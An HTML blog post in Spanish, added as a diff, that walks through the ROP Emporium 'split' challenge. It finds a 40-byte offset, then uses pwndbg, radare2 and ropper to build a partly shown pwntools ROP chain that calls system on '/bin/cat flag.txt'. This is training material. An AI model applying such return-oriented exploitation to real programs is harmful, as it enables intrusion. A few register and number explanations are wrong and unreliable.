@@ -1,0 +1,1292 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="google-translate-customization" content="108d9124921d80c3-80e20d618ff053c8-g4f02ec6f3dba68b7-c">
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>ROPemporium split - Usando ROP para escribir en RDI | c4rta</title>
+<meta name="generator" content="Jekyll v4.3.2">
+<meta property="og:title" content="ROPemporium split - Usando ROP para escribir en RDI">
+<meta name="author" content="c4rta">
+<meta property="og:locale" content="en_US">
+<meta name="description" content="Resolucion del desafio split de ROPemporium, donde usaremos el gadget pop rdi; ret para escribir en RDI la direccion de /bin/cat flag">
+<meta property="og:description" content="Resolucion del desafio split de ROPemporium, donde usaremos el gadget pop rdi; ret para escribir en RDI la direccion de /bin/cat flag">
+<link rel="canonical" href="https://ic4rta.github.io//explotacion%20binaria/2023/01/15/rop-emporium-split.html">
+<meta property="og:url" content="https://ic4rta.github.io//explotacion%20binaria/2023/01/15/rop-emporium-split.html">
+<meta property="og:site_name" content="c4rta">
+<meta property="og:type" content="article">
+<meta property="article:published_time" content="2023-01-15T00:00:00+00:00">
+<meta name="twitter:card" content="summary">
+<meta property="twitter:title" content="ROPemporium split - Usando ROP para escribir en RDI">
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"c4rta"},"dateModified":"2023-01-15T00:00:00+00:00","datePublished":"2023-01-15T00:00:00+00:00","description":"Resolucion del desafio split de ROPemporium, donde usaremos el gadget pop rdi; ret para escribir en RDI la direccion de /bin/cat flag","headline":"ROPemporium split - Usando ROP para escribir en RDI","mainEntityOfPage":{"@type":"WebPage","@id":"https://ic4rta.github.io//explotacion%20binaria/2023/01/15/rop-emporium-split.html"},"url":"https://ic4rta.github.io//explotacion%20binaria/2023/01/15/rop-emporium-split.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="shortcut icon" href="/favicon.png">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-noto-sans@0.0.72/index.min.css">
+  <link rel="stylesheet" href="/assets/css/main.css">
+  <script src="/assets/js/main.js"></script>
+  <link rel="stylesheet" href="/assets/css/syntax.css">
+<link type="application/atom+xml" rel="alternate" href="https://ic4rta.github.io//feed.xml" title="c4rta">
+<script>
+  function initGoogleAnalytics() {
+    var doNotTrack = (window.doNotTrack === "1" || navigator.doNotTrack === "1" ||
+      navigator.doNotTrack === "yes" || navigator.msDoNotTrack === "1");
+    var enableDNT = "true" == "true";
+
+    if (!enableDNT || !doNotTrack) {
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+      ga('create', 'UA-212989441-1', 'auto');
+      ga('send', 'pageview');
+    }
+  }
+  window.addEventListener("load", initGoogleAnalytics);
+</script>
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/default.min.css">
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+<!-- and it's easy to individually load additional languages -->
+<script charset="UTF-8" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/languages/go.min.js"></script>
+
+
+
+
+  
+      <!-- [function][get_value] true -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] #fff -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] #ff4e00 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] uppercase -->
+  
+
+<script>
+// Init highlight js
+document.addEventListener('DOMContentLoaded', function(event) {
+  var els = document.querySelectorAll('pre code')
+
+  function addLangData(block) {
+    var outer = block.parentElement.parentElement.parentElement;
+    var lang = block.getAttribute('data-lang');
+    for (var i = 0; i < outer.classList.length; i++) {
+      var cls = outer.classList[i];
+      if (cls.startsWith('language-')) {
+        lang = cls;
+        break;
+      }
+    }
+    if (!lang) {
+      cls = block.getAttribute('class');
+      lang = cls ? cls.replace('hljs ', '') : '';
+    }
+    if (lang.startsWith('language-')) {
+      lang = lang.substr(9);
+    }
+    block.setAttribute('class', 'hljs ' + lang);
+    block.parentNode.setAttribute('data-lang', lang);
+  }
+
+  function addBadge(block) {
+    var enabled = ('true' || 'true').toLowerCase();
+    if (enabled == 'true') {
+      var pre = block.parentElement;
+      pre.classList.add('badge');
+    }
+  }
+
+  function handle(block) {
+    addLangData(block);
+    addBadge(block)
+    hljs.highlightBlock(block);
+  }
+
+  for (var i = 0; i < els.length; i++) {
+    var el = els[i];
+    handle(el);
+  }
+});
+</script>
+
+<style>
+  /* code language badge */
+  pre.badge::before {
+    content: attr(data-lang);
+    color: #fff;
+    background-color: #ff4e00;
+    padding: 0 .5em;
+    border-radius: 0 2px;
+    text-transform: uppercase;
+    text-align: center;
+    min-width: 32px;
+    display: inline-block;
+    position: absolute;
+    right: 0;
+  }
+
+  /* fix wrong badge display for firefox browser */
+  code > table pre::before {
+    display: none;
+  }
+</style>
+
+</head>
+<body>
+
+
+
+
+  
+      <!-- [function][get_value] uppercase -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] {"image"=>"./assets/images/home/home-t.png", "opacity"=>0.618, "background"=>"#000", "height"=>"50vh", "min_height"=>"50vh", "heading_style"=>"font-size: 2.25em; font-weight: bold; ", "subheading_style"=>"color: gold"} -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] {"image"=>"./assets/images/home/home-t.png", "opacity"=>0.618, "background"=>"#000", "height"=>"50vh", "min_height"=>"50vh", "heading_style"=>"font-size: 2.25em; font-weight: bold; ", "subheading_style"=>"color: gold"} -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] ./assets/images/home/home-t.png -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] ./assets/images/home/home-t.png -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] #000 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] #000 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0.618 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0.618 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] font-size: 2.25em; font-weight: bold;  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] font-size: 2.25em; font-weight: bold;  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] color: gold -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] color: gold -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] true -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] true -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] true -->
+  
+
+<header class="site-header site-header-transparent" role="banner">
+
+  <div class="wrapper">    
+    <div class="site-header-inner">
+<span class="site-brand"><a class="site-brand-inner" rel="author" href="/">
+  <img class="site-favicon" title="c4rta" src="/favicon.png" onerror="this.style.display='none'">
+  c4rta
+</a>
+</span><nav class="site-nav">
+          <input type="checkbox" id="nav-trigger" class="nav-trigger">
+          <label for="nav-trigger">
+            <span class="menu-icon">
+              <svg viewbox="0 0 18 15" width="18px" height="15px">
+                <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"></path>
+              </svg>
+            </span>
+          </label>      
+          <div class="trigger">
+<a class="page-link" href="/">Home</a><a class="page-link" href="/categories.html">Categorias</a><a class="page-link" href="/tags.html">Etiquetas</a><a class="page-link" href="/about.html">Sobre Mi</a><a class="page-link" href="https://github.com/ic4rta" target="_blank"><img src="https://img.shields.io/badge/github-%23121011.svg?style=for-the-badge&logo=github&logoColor=white" alt="GitHub"></a>
+            <a class="page-link" href="http://twitter.com/_c4rta_" target="_blank"><img src="https://img.shields.io/badge/Twitter%20-%230077B5.svg?&style=for-the-badge&logo=Twitter&logoColor=white%22" alt="Twitter"></a>
+
+
+
+
+  
+      <!-- [function][get_value] [] -->
+  
+
+</div>
+        </nav>
+</div>
+  </div>
+
+</header>
+
+<!-- 页面菜单栏 注释=固定/不注释=隐藏 -->
+
+<script>
+  function initHeader() {
+    var lastScrollY = getScrollPos().y;
+    var documentElement = document.documentElement;
+
+    function storeScrollData() {
+      var y = getScrollPos().y;documentElement.setAttribute("data-header-transparent", "");var scrollStatus = "";
+
+      if (y <= 0) {
+        scrollStatus = "top";
+      } else if ((window.innerHeight + y) >= document.body.offsetHeight) {
+        scrollStatus = "bottom";
+      } else {
+        var isScrollDown = (y - lastScrollY > 0) ? true : false;
+        scrollStatus = isScrollDown ? "down" : "up";
+      }
+
+      lastScrollY = y;
+      documentElement.setAttribute("data-scroll-status", scrollStatus);
+    }
+
+    window.addEventListener('scroll', function(e) {
+      storeScrollData();
+    });
+
+    storeScrollData();
+  }
+  document.addEventListener('DOMContentLoaded', initHeader);
+</script>
+
+<!-- 页面菜单栏 注释=固定/不注释=隐藏 -->
+
+
+
+
+
+  
+      <!-- [function][get_value] [] -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] post-header.html -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] post-header.html -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] {"image"=>"./assets/images/home/home-t.png", "opacity"=>0.618, "background"=>"#000", "height"=>"50vh", "min_height"=>"50vh", "heading_style"=>"font-size: 2.25em; font-weight: bold; ", "subheading_style"=>"color: gold"} -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] {"image"=>"./assets/images/home/home-t.png", "opacity"=>0.618, "background"=>"#000", "height"=>"50vh", "min_height"=>"50vh", "heading_style"=>"font-size: 2.25em; font-weight: bold; ", "subheading_style"=>"color: gold"} -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] ./assets/images/home/home-t.png -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] ./assets/images/home/home-t.png -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] #000 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] #000 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0.618 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0.618 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] font-size: 2.25em; font-weight: bold;  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] font-size: 2.25em; font-weight: bold;  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] color: gold -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] color: gold -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] true -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] true -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+<style>
+    html .page-banner {
+      background: #000;
+    }
+  </style>
+<style>html .page-banner {
+      height:  18.4vh;
+      min-height: 50vh;
+    }
+    html[data-scroll-status="top"] .page-banner {
+      height: 50vh;
+    }
+  </style>
+<style>
+    html .page-banner .page-banner-img > *:first-child {
+      opacity: 0.618;
+    }
+
+    html[data-theme="dark"] .page-banner .page-banner-img > *:first-child {
+      opacity: 0.443724;
+    }
+  </style>
+<style>
+    html .page-banner .page-banner-inner > *:first-child > *:nth-child(1) {
+      font-size: 2.25em; font-weight: bold; 
+    }
+  </style>
+<style>
+    html .page-banner .page-banner-inner > *:first-child > *:nth-child(2) {
+      color: gold
+    }
+  </style>
+<section class="page-banner">
+    <div class="page-banner-img">
+<div style="background-image: url(/assets/images/home/home-t.png)"></div>
+        <img class="img-placeholder" src="/assets/images/home/home-t.png">
+</div>
+    <div class="wrapper">
+      <div class="page-banner-inner">
+<header class="post-header">
+  <h1 class="post-title p-name" itemprop="name headline">ROPemporium split - Usando ROP para escribir en RDI</h1>
+  <h2 class="post-subtitle"></h2>
+
+  <p class="post-meta">
+    <time class="dt-published" datetime="2023-01-15T00:00:00+00:00" itemprop="datePublished"><i class="fa fa-calendar"></i> Jan 15, 2023
+    </time>
+
+    
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+      <!-- [function][get_article_words] 1265 -->
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <span class="post-reading-time left-vsplit"><i class="fa fa-clock-o"></i> About 7 mins</span>
+  </p>
+<div class="post-tags"><a class="post-tag" href="/tags.html#ROP">#ROP</a></div></header>
+</div>
+    </div>
+  </section><script>
+  function hashLocate(hashValue) {
+    hashValue = hashValue.replace(/^.*#h-/, '');
+    hashValue = decodeURIComponent(hashValue);
+    var element = document.getElementById(hashValue);
+
+    if (!element) {
+      return;
+    }
+
+    var header = document.querySelector('header.site-header');
+    var headerRect = header.getBoundingClientRect();
+    var headerTop = Math.floor(headerRect.top);
+    var headerHeight = Math.floor(headerRect.height);
+    var scrollPos = getScrollPos();
+    var offsetY = element.offsetTop - (headerTop + headerHeight + 20);
+
+    if (offsetY == scrollPos.y) {
+      return;
+    }
+
+    if (headerTop == 0  && offsetY > scrollPos.y) {
+      offsetY += headerHeight + 2;
+    } else if (headerTop < 0  && offsetY < scrollPos.y) {
+      offsetY -= headerHeight - 2;
+    }
+
+    smoothScrollTo(offsetY);
+  }
+
+  // The first event occurred
+  window.addEventListener('load', function(event) {
+    if (window.location.hash) {
+      hashLocate(window.location.hash);
+    }
+  });
+
+  // The first event occurred
+  window.addEventListener('click', function(event) {
+    if (event.target.tagName.toLowerCase() == 'a') {
+      hashLocate(event.target.getAttribute('href'));
+    }
+  });
+</script>
+<div class="theme-toggle">
+  <input type="checkbox" id="theme-switch">
+  <label for="theme-switch">
+    <div class="toggle"></div>
+    <div class="names">
+      <p class="light">Light</p>
+      <p class="dark">Dark</p>
+    </div>
+  </label>
+</div>
+
+
+
+
+  
+      <!-- [function][get_value] auto -->
+  
+
+<script>
+  (function() {
+    var sw = document.getElementById('theme-switch');
+    var html = document.getElementsByTagName('html')[0];
+    var nightModeOption = ('auto' || 'auto').toLowerCase();
+    var storage = nightModeOption === 'manual'
+        ? localStorage
+        : sessionStorage;
+    var themeData = loadThemeData();
+
+    function saveThemeData(data) {
+      storage.setItem('theme', JSON.stringify(data));
+    }
+
+    function loadThemeData() {
+      var data = storage.getItem('theme');
+      try {
+        data = JSON.parse(data ? data : '');
+      } catch(e) {
+        data = { nightShift: undefined, autoToggleAt: 0 };
+        saveThemeData(data);
+      }
+      return data;
+    }
+
+    function handleThemeToggle(nightShift) {
+      themeData.nightShift = nightShift;
+      saveThemeData(themeData);
+      html.dataset.theme = nightShift ? 'dark' : 'light';
+      setTimeout(function() {
+        sw.checked = nightShift ? true : false;
+      }, 50);
+    }
+
+    function autoThemeToggle() {
+      // Next time point of theme toggle
+      var now = new Date();
+      var toggleAt = new Date();
+      var hours = now.getHours();
+      var nightShift = hours >= 19 || hours <=7;
+
+      if (nightShift) {
+        if (hours > 7) {
+          toggleAt.setDate(toggleAt.getDate() + 1);
+        }
+        toggleAt.setHours(7);
+      } else {
+        toggleAt.setHours(19);
+      }
+
+      toggleAt.setMinutes(0);
+      toggleAt.setSeconds(0);
+      toggleAt.setMilliseconds(0)
+
+      var delay = toggleAt.getTime() - now.getTime();
+
+      // auto toggle theme mode
+      setTimeout(function() {
+        handleThemeToggle(!nightShift);
+      }, delay);
+
+      return {
+        nightShift: nightShift,
+        toggleAt: toggleAt.getTime()
+      };
+    }
+
+    // Listen the theme toggle event
+    sw.addEventListener('change', function(event) {
+      handleThemeToggle(event.target.checked);
+    });
+
+    if (nightModeOption == 'auto') {
+      var data = autoThemeToggle();
+
+      // Toggle theme by local setting
+      if (data.toggleAt > themeData.autoToggleAt) {
+        themeData.autoToggleAt = data.toggleAt;
+        handleThemeToggle(data.nightShift);
+      } else {
+        handleThemeToggle(themeData.nightShift);
+      }
+    } else if (nightModeOption == 'manual') {
+      handleThemeToggle(themeData.nightShift);
+    } else {
+      var nightShift = themeData.nightShift;
+      if (nightShift === undefined) {
+        nightShift = nightModeOption === 'on';
+      }
+      handleThemeToggle(nightShift);
+    }
+  })();
+</script>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <div class="framework">
+  <section class="main">
+
+     <div class="post">
+  <section>
+
+
+
+
+  
+      <!-- [function][get_value] {"image"=>"./assets/images/home/home-t.png", "opacity"=>0.618, "background"=>"#000", "height"=>"50vh", "min_height"=>"50vh", "heading_style"=>"font-size: 2.25em; font-weight: bold; ", "subheading_style"=>"color: gold"} -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] [] -->
+  
+
+<article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+    <div class="post-content e-content" itemprop="articleBody">
+
+      <p class="lead">Resolucion del desafio split de ROPemporium, donde usaremos el gadget pop rdi; ret para escribir en RDI la direccion de /bin/cat flag</p>
+
+<h2 id="a-tomar-en-cuenta">A tomar en cuenta</h2>
+
+<ul>
+  <li>La dirección máxima en 64 bits es <code class="language-plaintext highlighter-rouge">0x00007FFFFFFFFFFF</code> y el RIP no puede sobrescribir una dirección mayor que este valor.</li>
+  <li>Los parámetros de función se pasan a los registros. Estos registros son RDI, RSI, RDX, RSX, R8, R9, respectivamente. Si el número de parámetros es superior a 6, se guardan en el stack</li>
+</ul>
+
+<h2 id="analizando-el-binario">Analizando el binario</h2>
+
+<p>Primeramente veremos con que protecciones cuenta el binario, esto con <code class="language-plaintext highlighter-rouge">checksec</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>checksec --file=split                                             ─╯
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
+Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   70 Symbols	  No	0		3		split
+</code></pre></div></div>
+<p>Como se puede ver tiene <code class="language-plaintext highlighter-rouge">NX</code> asi que no podemos ejecutar codigo en el stack, asi que para resolverlo vamos a usar ROP (Programacion Orientada el Retorno).</p>
+
+<p>Ahora metere el binario a radare2 para ver lo que esta haciendo en el main:</p>
+
+<p><img src="/assets/img/spilt/radare1.png" alt=""></p>
+
+<p>Aqui lo unico interesante es que se esta llamando a la funcion <code class="language-plaintext highlighter-rouge">pwnme</code> en la direccion <code class="language-plaintext highlighter-rouge">0x004006d2</code>. Y lo demas simplemente es el mensajito de bienvenida.</p>
+
+<p>En la funcion <code class="language-plaintext highlighter-rouge">pwnme</code> tenemos esto:</p>
+
+<p><img src="/assets/img/spilt/radare2.png" alt=""></p>
+
+<ul>
+  <li>En color rojo se esta declarando un puntero llamado <code class="language-plaintext highlighter-rouge">buf</code> que esta 0x20 por debajo del <code class="language-plaintext highlighter-rouge">RBP</code>
+</li>
+  <li>En color amarillo se esta creando un buffer de <code class="language-plaintext highlighter-rouge">0x20</code> (32 bytes) el cual se almacena en <code class="language-plaintext highlighter-rouge">buf</code>
+</li>
+  <li>En color verde es cuando el programa recibe nuestro input el cual lee <code class="language-plaintext highlighter-rouge">0x60</code> bytes en <code class="language-plaintext highlighter-rouge">buf</code>.</li>
+</ul>
+
+<p>Esto no es todo, siempre hay que mostrar todas las funciones en un programa, en radare lo hacemos con <code class="language-plaintext highlighter-rouge">alf</code>. Veamos:</p>
+
+<p><img src="/assets/img/spilt/radare3.png" alt=""></p>
+
+<p>Vemos como existe una funcion llamada <code class="language-plaintext highlighter-rouge">usefulFunction</code> la cual nunca se llama en el programa, y si vemos codigo tenemos algo como esto:</p>
+
+<p><img src="/assets/img/spilt/radare4.png" alt=""></p>
+
+<p>Se esta haciendo uso de la funcion <code class="language-plaintext highlighter-rouge">system</code> para llamar a <code class="language-plaintext highlighter-rouge">/bin/ls</code>, esto no es lo que queremos, nosotros queremos que llame a <code class="language-plaintext highlighter-rouge">/bin/cat flag.txt</code>, y la pregunta es… ¿Como yo se que en el binario se esta llamando a <code class="language-plaintext highlighter-rouge">/bin/cat flag.txt</code>?, pues facil, simplemente podemos mostrar los strings con <code class="language-plaintext highlighter-rouge">rabin2 -z split</code>:</p>
+
+<p><img src="/assets/img/spilt/radare5.png" alt=""></p>
+
+<p>Podemos ver que en la seccion <code class="language-plaintext highlighter-rouge">.data</code> esta <code class="language-plaintext highlighter-rouge">/bin/cat flag.txt</code>, asi que tenemos que sustituirlo por <code class="language-plaintext highlighter-rouge">/bin/ls</code></p>
+
+<h2 id="crafteando-el-exploit">Crafteando el exploit</h2>
+
+<h3 id="sacando-el-offset-del-rip">Sacando el offset del RIP</h3>
+
+<p>Con <code class="language-plaintext highlighter-rouge">pwndbg</code> voy a ocasionar que el buffer pete pasandole la cadena generada por <code class="language-plaintext highlighter-rouge">cyclic 100</code>, y deberiamos ver algo como esto:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>*RBP  0x6161616161616165 ('eaaaaaaa')
+*RSP  0x7fffffffda78 ◂— 0x6161616161616166 ('faaaaaaa')
+*RIP  0x400741 (pwnme+89) ◂— ret 
+───────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────
+ ► 0x400741 &lt;pwnme+89&gt;    ret    &lt;0x6161616161616166&gt;
+</code></pre></div></div>
+
+<p>Vemos que no sobrescribimos RIP en absoluto. Esto se debe a que sobrescribimos RIP con una dirección no válida mayor que <code class="language-plaintext highlighter-rouge">0x00007fffffffffff</code>. Esto hace que el sistema operativo genere una excepción, y por lo tanto, no actualice el valor de RIP en absoluto.</p>
+
+<p>Asi que para sacar su offset podemos usar el registro <code class="language-plaintext highlighter-rouge">RSP</code>, para sacar el offset de <code class="language-plaintext highlighter-rouge">RSP</code> ponemos <code class="language-plaintext highlighter-rouge">cyclic -l faaaaaaa</code> y esto nos da un offset de <code class="language-plaintext highlighter-rouge">40</code>, este offset es el mismo que tiene el <code class="language-plaintext highlighter-rouge">saved-rip</code>, y tiene el mismo ya que el <code class="language-plaintext highlighter-rouge">saved rip</code> tiene el valor guardado del puntero de instruccion, es decir, adonde regresar, pero este valor se guarda en el stack en una direccion en particular, y esa direccion es <code class="language-plaintext highlighter-rouge">0x7fffffffda78</code>, esto lo podemos saber si mostramos el frame y vemos esta parte:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> Saved registers:
+  rip at 0x7fffffffda78
+</code></pre></div></div>
+<p>Y si mostramos unos cuantos byes del stack, con el comando <code class="language-plaintext highlighter-rouge">x/30wx $rsp</code> vemos algo como esto:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x7fffffffda78:	0x61616166	0x61616161	0x61616167	0x61616161
+0x7fffffffda88:	0x61616168	0x61616161	0x61616169	0x61616161
+0x7fffffffda98:	0x6161616a	0x61616161	0x6161616b	0x61616161
+0x7fffffffdaa8:	0x6161616c	0x61616161	0xffffdb98	0x00007fff
+0x7fffffffdab8:	0x35f3056c	0x394c8b3a	0x00000000	0x00000000
+0x7fffffffdac8:	0xffffdba8	0x00007fff	0x00000000	0x00000000
+0x7fffffffdad8:	0xf7ffd000	0x00007fff	0x80d1056c	0xc6b374c5
+0x7fffffffdae8:	0xb179056c	0xc6b36486
+</code></pre></div></div>
+<p>En donde en la direccion <code class="language-plaintext highlighter-rouge">0x7fffffffda78</code> tenemos los valores <code class="language-plaintext highlighter-rouge">0x61616166	0x61616161</code>, los cuales son los mismos que tiene el <code class="language-plaintext highlighter-rouge">RSP</code>, asi que podemos decir que el <code class="language-plaintext highlighter-rouge">saved rip</code> tiene el valor <code class="language-plaintext highlighter-rouge">0x6161616161616166</code> y el <code class="language-plaintext highlighter-rouge">RSP</code> el valor <code class="language-plaintext highlighter-rouge">faaaaaaa</code> (que es lo mismo que <code class="language-plaintext highlighter-rouge">0x6161616161616166</code> pero en decimal), ademas podemos tambien hacer un <code class="language-plaintext highlighter-rouge">cyclic -l 0x6161616161616166</code> y nos dara un offset de 40 al igual que el <code class="language-plaintext highlighter-rouge">RSP</code>. Y como ultimo, en este caso le estamos indicando al programa que regrese a <code class="language-plaintext highlighter-rouge">0x6161616161616166</code>, lo cual es incorrecto. Y por toda esta explicacion es la razon por la cual el <code class="language-plaintext highlighter-rouge">saved rip</code> y el <code class="language-plaintext highlighter-rouge">RSP</code> tienen el mismo offset (nunca habia explicado esto y es bueno saberlo).</p>
+
+<h3 id="direccion-de-system">Direccion de system</h3>
+
+<p>Esto es muy facil, para esto, usaremos la direccion de system que se encuentra en la funcion <code class="language-plaintext highlighter-rouge">usefulFunction</code>, como se puede ver aca:</p>
+
+<p><img src="/assets/img/spilt/radare6.png" alt=""></p>
+
+<p>La direccion es: <code class="language-plaintext highlighter-rouge">0x000000000040074b</code></p>
+
+<h3 id="direccion-de-bincat-flagtxt">Direccion de /bin/cat flag.txt</h3>
+
+<p>Esto lo hacemos con <code class="language-plaintext highlighter-rouge">rabin2 -z split</code> y copiamos la direccion, la cual es: <code class="language-plaintext highlighter-rouge">0x00601060</code></p>
+
+<h3 id="direccion-de-pop-rdi">Direccion de pop rdi</h3>
+
+<p>Como mencione hace un rato, usamos esto para meter en el registro rdi: <code class="language-plaintext highlighter-rouge">/bin/cat flag.txt</code>. La direccion de pop rdi la podemos sacar con herramientas como ropper, la cual nos permiten ver todos los gadgets del programa. Usamos el comando <code class="language-plaintext highlighter-rouge">ropper -f split</code>.</p>
+
+<p>Vemos como nos encontro el gadget:</p>
+
+<p><code class="language-plaintext highlighter-rouge">0x00000000004007c3: pop rdi; ret;</code> y su direccion es <code class="language-plaintext highlighter-rouge">0x00000000004007c3</code></p>
+
+<h2 id="ejecutando-el-exploit">Ejecutando el exploit</h2>
+
+<p>Al final nuestro exploit quedo asi:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="sh">"</span><span class="s">./split</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="n">padding</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">40</span>
+<span class="n">system</span> <span class="o">=</span> <span class="mh">0x000000000040074b</span>
+<span class="n">bin_cat</span> <span class="o">=</span> <span class="mh">0x00601060</span>
+<span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x00000000004007c3</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">bin_cat</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
+
